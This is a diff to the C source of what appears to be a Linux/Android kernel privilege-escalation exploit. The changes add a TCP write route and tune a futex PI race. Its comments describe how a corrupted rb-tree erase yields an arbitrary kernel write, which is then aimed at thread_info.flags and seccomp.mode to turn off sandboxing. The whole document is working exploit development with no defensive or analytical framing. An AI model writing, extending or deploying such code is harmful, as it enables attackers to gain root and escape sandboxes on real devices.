@@ -217,7 +217,11 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   timeout.tv_sec += ROUTE_WAIT_SECONDS;
   atomic_store(&waiter_waiting, 1);
   futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
-  do_pselect_fake_lock_route();
+  if (tcp_route_selected()) {
+    do_tcp_fake_lock_route();
+  } else {
+    do_pselect_fake_lock_route();
+  }
   atomic_store(&route_done, 1);
   futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
   while (!atomic_load(&owner_chain_done)) usleep(1000);
@@ -262,7 +266,12 @@ void *consumer_thread(void *arg __attribute__((unused))) {
         atomic_fetch_add(&consumer_calls, 1);
         atomic_store(&consumer_inflight, 1);
         errno = 0;
-        long sched_ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
+        /* rotate the nice every call; (calls%19)+1 is what makes
+         * sched_setattr succeed on 6.1 compact */
+        int consumer_nice = (active_offsets && active_offsets->compact_waiter)
+                                ? (calls_this_seq % 19) + 1
+                                : PSELECT_CONSUMER_NICE;
+        long sched_ret = sched_setattr_tid(tid, consumer_nice);
         if (sched_ret != 0) {
           struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
           long fret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
@@ -323,10 +332,9 @@ int run_main_route_threads(void) {
 
 static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) {
   pr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc, target, mode, leaf);
-  /* leaf=1 uses the "write 0" payload (fake_right=0). __rb_erase_augmented()
-   * case 1 then makes __rb_change_child() write parent->rb_right (= target)
-   * with the erased node's rb_right value: fake_left is always NULL so case 1
-   * always fires, and the erased node is RED so no color fixup runs. */
+  /* Both transports write *(target) := value through the erase left-only
+   * relink: waiter words are {pc = value, right = 0, left = target} and
+   * the node is RED so no color fixup runs. leaf=1 is the value=0 payload. */
   pselect_child_node = leaf ? 0 : 1;
   set_pselect_write_mode(target, mode);
   TIMER("  heap spray start");
@@ -990,23 +998,27 @@ int run_exploit(int argc, char **argv) {
      * (adb/shell skips). fork() re-arms TIF_SECCOMP while mode != 0, so mode
      * must be zeroed too; do both writes back-to-back with one probe
      * (real finit_module calls trip vendor root guards).
-     * Leaf writes land on [target] or [target+8]; a comm probe picks the side
-     * before targeting thread_info.flags (task+0) / seccomp.mode. */
+     * tcp stamps *(target) exactly, so aim straight at thread_info.flags
+     * (task+0) / seccomp.mode; only the pselect fallback needs the comm
+     * probe to tell [target] from [target+8]. */
     if (!process_has_seccomp()) {
       pr_success("no app seccomp filter (adb/shell flow); skipping W3\n");
       seccomp_ok = 1;
       break;
     }
 
+    int tcp_writes = tcp_route_selected();
     struct w3_stage_context w3_context = {
       .pipes = &pipes,
-      .leaf_to_target8 = 1,
+      .leaf_to_target8 = !tcp_writes,
     };
-    int dir_ok = retry_write_stage(
-        "W3-0: leaf dir", child_task + TASK_COMM_OFF, 1, 4, 50000,
-        verify_leaf_dir_stage, &w3_context, 1);
-    if (!dir_ok) {
-      pr_warning("W3 leaf direction probe failed; assuming [target+8]\n");
+    if (!tcp_writes) {
+      int dir_ok = retry_write_stage(
+          "W3-0: leaf dir", child_task + TASK_COMM_OFF, 1, 4, 50000,
+          verify_leaf_dir_stage, &w3_context, 1);
+      if (!dir_ok) {
+        pr_warning("W3 leaf direction probe failed; assuming [target+8]\n");
+      }
     }
 
     uintptr_t flags_target = w3_context.leaf_to_target8
